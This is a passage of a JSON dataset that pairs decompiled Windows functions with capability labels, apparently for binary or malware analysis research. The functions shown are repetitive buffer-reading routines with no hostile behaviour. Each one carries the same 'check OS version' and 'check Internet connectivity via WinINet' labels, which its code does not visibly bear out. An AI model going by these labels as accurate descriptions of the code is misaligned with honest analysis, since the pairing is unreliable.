        "decompiled_code": "\nuint32_t __cdecl fcn.0043dc2f(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        piVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = piVar2 + 2;\n        iVar1 = *piVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar4 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 413
    },
    "0043dcbe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043dcbe(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        piVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = piVar2 + 2;\n        iVar1 = *piVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar4 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 413
    },
    "0043dd4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043dd4d(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        piVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = piVar2 + 2;\n        iVar1 = *piVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar4 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 394
    },
    "0043dddd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043dddd(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        piVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = piVar2 + 2;\n        iVar1 = *piVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar4 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 393
    },
    "0043deed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043deed(uchar *arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 4;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 365
    },
    "0043df7b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043df7b(uchar *arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 4;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 367
    },
    "0043e03f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043e03f(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        uVar1 = *puVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar4 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 411
    },
    "0043e0ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043e0ce(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        uVar1 = *puVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar4 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 412
    },
    "0043e15d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043e15d(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        uVar1 = *puVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar4 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 392
    },
    "0043e1ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043e1ed(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        uVar1 = *puVar2;\n    }\n    else {\n        uVar4 = *(in_ECX + 0xaa8);\n        if (99 < uVar4) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar4 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar4 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar4 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 393
    },
    "0043e2fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043e2fd(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        piVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = piVar3 + 1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar1 = *(in_ECX + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            uVar2 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar2;\n        }\n        piVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    iVar1 = *piVar3;\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 406
    },
    "0043e386": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043e386(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        piVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = piVar3 + 1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar1 = *(in_ECX + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            uVar2 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar2;\n        }\n        piVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    iVar1 = *piVar3;\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 406
    },
    "0043e40f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043e40f(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        piVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = piVar3 + 1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar1 = *(in_ECX + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            uVar2 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.00454191(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar2;\n        }\n        piVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    iVar1 = *piVar3;\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 387
    },
    "0043e499": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043e499(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        piVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = piVar3 + 1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar1 = *(in_ECX + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            uVar2 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.004541f5(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar2;\n        }\n        piVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    iVar1 = *piVar3;\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 387
    },
    "0043e59f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e59f(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        uVar4 = *puVar1;\n        arg_8h[1] = 0;\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar4 = **(in_ECX + 0x46c + uVar2 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 407
    },
    "0043e635": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e635(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        uVar4 = *puVar1;\n        arg_8h[1] = 0;\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar4 = **(in_ECX + 0x46c + uVar2 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 407
    },
    "0043e6cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e6cb(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        uVar4 = *puVar1;\n        arg_8h[1] = 0;\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar4 = **(in_ECX + 0x46c + uVar2 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 388
    },
    "0043e762": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e762(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        uVar4 = *puVar1;\n        arg_8h[1] = 0;\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        uVar4 = **(in_ECX + 0x46c + uVar2 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 388
    },
    "0043e875": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e875(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 3, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 364
    },
    "0043e903": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e903(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 3, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 365
    },
    "0043e991": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e991(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar2 * 0x10, 3, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 345
    },
    "0043ea20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
